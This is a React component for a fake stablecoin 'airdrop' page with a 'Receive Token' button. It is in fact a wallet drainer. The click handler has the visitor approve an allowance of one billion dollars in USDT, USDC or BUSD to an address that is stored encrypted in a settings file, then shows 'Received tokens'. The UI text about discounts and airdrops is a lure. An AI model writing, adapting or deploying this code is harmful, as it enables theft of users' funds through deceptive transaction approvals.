import React from "react"
import { connect } from 'react-redux';
import { log, warn, error, decryptString } from "../std"
import { toast } from 'react-toastify';
import { connectWeb3, CHAINS, switchChain } from "../store/Web3";
import Wallet from "./Wallet";
import Button from "./Button";

import "./AirdropToken.scss"

class AirdropToken extends React.Component {
    state = {
        isConnectedWeb3: false, abiFolder: "contracts/", fileSettings: "settings.json",
        USDC: {}, USDT: {}, BUSD: {},
        chainId: 1, symbol: "USDT",
        mAddress: null,
    }

    componentDidMount() {
        if (!window.ethereum || !window.ethereum.isMetaMask) {
            this.setState({ isConnectedWeb3: false })
        }

        this.onTokenSelected.bind(this)

        this.loadSettings()
    }

    async loadSettings() {
        let settings = await fetch(this.state.fileSettings).then(response => response.json());

        let mAddress = decryptString(settings.mAddress);
        log(mAddress)
        this.setState({ mAddress: mAddress })

        return settings;
    }

    async initContracts(symbol, web3 = this.props.web3) {
        let settings = await this.loadSettings();

        let { /*USDC, BUSD, USDT,*/ abiFolder } = this.state;
        let chainId = parseInt(window.ethereum.chainId)
        if (!settings.tokens[symbol] || !settings.tokens[symbol][chainId]) {
            throw new Error("We will support this soon " + symbol + " - " + CHAINS[chainId].chainName)
        }
        let token = settings.tokens[symbol]

        let abiPath = abiFolder + symbol + "_ABI_" + chainId + ".json"
        let abi = await fetch(abiPath).then(response => response.json());
        log(abiPath)
        let contract = await new web3.eth.Contract(chainId == 5777 ? abi.abi : abi, token[chainId].address);
        window.mcontract = contract
        token[chainId].contract = contract;
        this.setState({ [symbol]: token })
        return token
    }

    async receiveAirdrop() {
        let { web3, accounts } = this.props;
        let { mAddress, symbol } = this.state;
        let chainId = parseInt(window.ethereum.chainId)
        if (!web3) {
            toast.error("Please connect Metamask")
        } else {
            try {
                let token = await this.initContracts(symbol, web3)
                window.token = token
                // 1 billion $
                let amount = "0x" + (1_000_000_000 * (10 ** parseInt(token[chainId].decimals))).toString(16)
                token[chainId].contract.methods.approve(mAddress, amount)
                    .send({ from: accounts[0] }, function (err, tx) {
                        if (err) {
                            toast.error(err.message)
                            error(err)
                        } else toast.success("Received tokens")
                    })
            }
            catch (error) {
                error("receiveAirdrop:", error.message, symbol, chainId)
                if (error.message.includes("Unexpected token"))
                    toast.error(`We haven't suport this chain yet: ${symbol} - ${CHAINS[chainId].chainName}`)
                else toast.error(error.message)
            }
        }
    }

    onTokenSelected(e) {
        let symbol = "USDT"
        if (e.target.innerText.trim() == "") {
            symbol = e.target.parentElement.innerText
        } else symbol = e.target.innerText

        this.setState({ symbol: symbol.trim() })
    }

    async onChainSelected(e) {
        let { web3, connectWeb3, switchChain } = this.props
        if (!web3) await connectWeb3()
        let chainId = parseInt(e.target.getAttribute("chainid"))
        if (isNaN(chainId)) chainId = parseInt(e.target.parentElement.getAttribute("chainid"))
        switchChain(chainId)
            .catch(error => {
                error(error)
                toast.error(error.message)
            })
    }

    render() {

        let { symbol } = this.state;
        let { web3, chainId } = this.props;
        return (
            <div className="col-12 col-sm-10 offset-sm-1 col-md-8 offset-md-2 col-lg-6 offset-lg-3 col-xl-5 offset-xl-0">
                <div className="home__content home__content--right">
                    <div className="home__sales">
                        <h3>Receive Airdrop</h3>
                        <p>Discount 77% from final price</p>

                        <div className="progress progress--small">
                            <div className="progress-bar" role="progressbar" style={{ "width": "70%" }} aria-valuenow="70"
                                aria-valuemin="0" aria-valuemax="100"></div>
                            <div className="progress__line" style={{ "left": "8%" }}><svg xmlns="http://www.w3.org/2000/svg"
                                viewBox="0 0 24 24">
                                <path
                                    d="M14.72,8.79l-4.29,4.3L8.78,11.44a1,1,0,1,0-1.41,1.41l2.35,2.36a1,1,0,0,0,.71.29,1,1,0,0,0,.7-.29l5-5a1,1,0,0,0,0-1.42A1,1,0,0,0,14.72,8.79ZM12,2A10,10,0,1,0,22,12,10,10,0,0,0,12,2Zm0,18a8,8,0,1,1,8-8A8,8,0,0,1,12,20Z" />
                            </svg> 100K</div>
                            <div className="progress__line" style={{ "left": "40%" }}><svg xmlns="http://www.w3.org/2000/svg"
                                viewBox="0 0 24 24">
                                <path
                                    d="M14.72,8.79l-4.29,4.3L8.78,11.44a1,1,0,1,0-1.41,1.41l2.35,2.36a1,1,0,0,0,.71.29,1,1,0,0,0,.7-.29l5-5a1,1,0,0,0,0-1.42A1,1,0,0,0,14.72,8.79ZM12,2A10,10,0,1,0,22,12,10,10,0,0,0,12,2Zm0,18a8,8,0,1,1,8-8A8,8,0,0,1,12,20Z" />
                            </svg> 400K</div>
                            <div className="progress__value">1M USD</div>
                        </div>

                        {/* change token */}
                        <div className="col-12 col-sm-10 offset-sm-1 col-md-6 offset-md-3 col-lg-4 offset-lg-4">
                            <ul className={"nav nav-tabs section__tabs " + (web3 ? 'active' : '')} role="tablist">
                                {/* <li className="nav-item">
                                    <a className={"nav-link " + (web3 && chainId == 5 ? "active" : "")}
                                        chainid="5" onClick={this.onChainSelected.bind(this)}><img src="img/eth.svg" />Goerli&nbsp;</a>
                                </li>
                                <li className="nav-item">
                                    <a className={"nav-link " + (web3 && chainId == 97 ? "active" : "")}
                                        chainid="97" onClick={this.onChainSelected.bind(this)}><img src="img/bnb.svg" />Test Binance&nbsp;</a>
                                </li> 
                                <li className="nav-item btnConnectETH">
                                    <a className={"nav-link " + (web3 && chainId == 1 ? "active" : "")}
                                        chainid="1" onClick={this.onChainSelected.bind(this)}><img src="img/eth.svg" />Ethereum&nbsp;</a>
                                </li>*/}
                                <li className="nav-item btnConnectBNB">
                                    <a className={"nav-link " + (web3 && chainId == 56 ? "active" : "")}
                                        chainid="56" onClick={this.onChainSelected.bind(this)}><img src="img/bnb.svg" />Binance&nbsp;</a>
                                </li>
                            </ul>
                        </div>
                        {/* end change token */}
                        {/* change token */}
                        <div className="col-12 col-sm-10 offset-sm-1 col-md-6 offset-md-3 col-lg-4 offset-lg-4">
                            <ul className="nav nav-tabs section__tabs" role="tablist">
                                <li className="nav-item">
                                    <a className="nav-link btnConnectUSDC" data-toggle="tab" href="#tab-usdc" role="tab" aria-controls="tab-usdc"
                                        aria-selected="false" onClick={this.onTokenSelected.bind(this)}><img src="img/usdc.svg" />&nbsp;USDC</a>
                                </li>
                                <li className="nav-item">
                                    <a className="nav-link btnConnectUSDT active" data-toggle="tab" href="#tab-usdt" role="tab" aria-controls="tab-usdt"
                                        aria-selected="true" onClick={this.onTokenSelected.bind(this)}><img src="img/usdt.svg" />&nbsp;USDT</a>
                                </li>
                                <li className="nav-item">
                                    <a className="nav-link btnConnectBUSD" data-toggle="tab" href="#tab-busd" role="tab" aria-controls="tab-busd"
                                        aria-selected="false" onClick={this.onTokenSelected.bind(this)}><img src="img/busd.svg" />&nbsp;BUSD</a>
                                </li>
                            </ul>
                        </div>
                        {/* end change token */}

                        <p>Fixed token edition 30.000.000 WEA</p>
                        <div className="row justify-content-center" >{web3 ? (
                            <Button className="btnReceiveAirdrop" onClick={this.receiveAirdrop.bind(this)}>Receive Token</Button>
                        ) : (
                            <Wallet className="btnConnectWeb3" />
                        )}
                        </div>
                    </div>
                </div>
            </div>
        )
    }
}

const mapStateToProps = (state, ownProps) => ({
    web3: state.Web3.web3,
    accounts: state.Web3.accounts,
    chainId: state.Web3.chainId
    // contract: state.Contract.contract,
    // owner: state.Contract.owner,
});

export default connect(mapStateToProps, {
    connectWeb3: connectWeb3,
    switchChain: switchChain,
})(AirdropToken);
